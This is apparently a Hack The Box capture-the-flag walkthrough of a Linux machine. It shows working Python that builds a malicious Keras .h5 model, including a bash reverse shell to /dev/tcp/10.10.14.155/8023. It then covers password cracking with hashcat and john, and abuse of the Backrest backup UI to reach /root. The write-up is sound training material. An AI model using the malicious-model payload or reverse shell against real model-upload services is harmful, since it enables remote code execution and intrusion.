# HTB Walkthrough — Machine: Artificial

**Target IP:** `10.10.11.74`  
**Author:** Miguel Reis
**Date:** 2025-06-30
**OS**: Linux

---

## 1. Initial Scan

My initial nmap scan identified 2 open ports:
- SSH running on port `22`  
- An nginx web server on port `80`

![[Artificial-20250629185224.png]]

To be able to access the webpage we need to add it to our `/etc/hosts` file.

---

## 2. Website Enumeration

Accessing the webpage at `http://artificial.htb/` we find a website related to AI models. We can also find a login and register page.
After creating a test account we are redirected to `/dashboard` that allows us to upload an AI model
![[Artificial-20250629191316.png]]

The site also shows the Dockerfile used to run uploaded models:

```Dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

When i try to upload files it shows it's expecting an `.h5` filetype, after some research i find this files are used to store large amounts of data and is commonly used by various libraries to store an entire model.

Searching for "h5 rce file" we find this articles: 
- https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
- https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass

---

## 3. Exploitation

This attacks refers the "CVE-2024-3660" which affect versions before 2.13, so this should not work on the machine since the requirements and Dockerfile mention `tensorflow-cpu-2.13.1`, however in the second article it mentions "\[safe_mode] does
not exist in the prior versions of the API. Nor is the check performed on models that have been stored using earlier versions of the Keras serialization format (i.e., v2 SavedModel, legacy H5)." Since the website allows the upload of `.h5` files the model we upload can bypass this verification.

In order to create the exploit model we use docker and create a container using the Dockerfile provided.

```
sudo docker build -t tf-local-env .
```


We can mount our current directory inside the container in order to have access to our files inside the container with:

```
docker run --rm -it -v "$PWD":/code tf-local-env
```

- `docker run`: Starts a new Docker container.
- `--rm`: Automatically removes the container when you exit it, so it doesn't keep running or take up space.
- `-it`: Runs the container in interactive mode with a terminal, so you can interact with the shell.
- `-v "$PWD":/code`: This is the **volume mount** part.
    
    - `-v` stands for **volume**.
    - `"$PWD"` is an environment variable that expands to your current working directory on your **host machine**.
    - `/code` is the **directory inside the container** where your current folder will be mounted.

In this container we have the `tensorflow` version running as similar as the one on the target, we can then create a sample exploit model with:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("echo Command Executed ")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Now to test in our environment if this would work we can start an interactive python shell.
![[Artificial-20250629205325.png]]

After seeing the exploit worked in our simulated environment we can try and create an exploit model that would give us a reverse shell 

---

## 4. Reverse Shell

Similar to our other model we use the following python script to create the exploit:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.155/8023 0>&1' ")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Then again on our container we just run `python3 create_model.py`

Giving us the file `exploit.h5` that we can upload to the website

We setup a listener:

```bash
nc -nvlp 8023
```

After uploading we simply click the "View Predictions" button on the website and successfully get a reverse shell.
![[Artificial-20250629213415.png]]

---

## 5. User Access

On the app home directory we find the `app.py` file, inspecting it we see it contains the API key exposed, alongside the configurations for the database and the password hashing.

![[Artificial-20250629213955.png]]

We find a user on the machine called `gael`.

I explored the database and found a user named `gael` with an MD5-hashed password:

![[Artificial-20250629215340.png]]

Through the `app.py`file we see the password is hashed with:

```python
def hash(password):
 password = password.encode()
 hash = hashlib.md5(password).hexdigest()
 return hash
```

We can try to crack the password with a wordlist using:

```bash
hashcat -a 0 -m 0 c99175974b6e192936d97224638a34f8 /usr/share/wordlists/rockyou.txt 

```

We get a match:
![[Artificial-20250629221002.png]]


Trying to `ssh` into the machine with the user `gael` and the found password we successfully get user access into the machine, finding the flag at the home directory of the user.

---

## 8. Privilege Escalation

No sudo permissions were granted.

We then use linenum to check for privilege escalation paths.

We find there are 2 services running locally:
![[Artificial-20250629223711.png]]

After doing port forward with:

```bash
ssh -L <port>:localhost:<port> gael@artificial.htb
```


We find the webserver is running on port 5000 and the service running on port 9898 is `Backrest 1.7.2` which is a web ui which wraps the [restic](https://restic.net/) CLI and makes it easy to create repos, browse snapshots, and restore files. https://github.com/garethgeorge/backrest. While prompted for credentials we try the the previous found for the user "gael" without success.

After some search i find the `restic-cli` must be installed to run backrest and by checking the backrest service i find the path and check that i can run it. Which does not help us any further because we do not have read access to any restic repo in the system.

![[Artificial-20250629230247.png]]

Checking the groups the user belongs to we find he belongs to `gael` and `sysadm`, this last one catches our attention and we try to find if the group owns any file with:

```bash
find / -group sysadm
```

We find a compressed file in `/var/backups/backrest_backup.tar.gz`, to copy it to our local machine we can use this command on our machine:

```bash
scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz ./
```

After extracting the contents we see this, as the name suggests, is a backup from backrest, this allows us to check the config file we did not have access to, showing us the credentials for backrest.
![[Artificial-20250630172601.png]]
We find the username and what appears to be an hashed password using bcrypt. Bcrypt hashes start with `$2` so this is still not crackable we need to decode it from base64:

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

Giving us a proper bcrypt hash, we can try to crack it with JohnTheRipper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt
```

Getting a match:
![[Artificial-20250630215218.png]]

With this password we can login on the Backrest web ui.

---

## 9. Root Access

Accessing the Backrest Web UI, we find it empty.
![[Artificial-20250630215323.png]]

We can then create a repository pointing to the `/root`  directory:

![[Artificial-20250630221308.png]]

After that we can use restic commands by clicking "Run command" on the repository window and create backup of the root flag and print it.

![[Artificial-20250630221605.png]]


---

## 💭 Final Thoughts

This machine was a though challenge, especially getting the root flag. It helped me expand my knowledge regarding ML models, Docker containerization, Restic for backup and password cracking.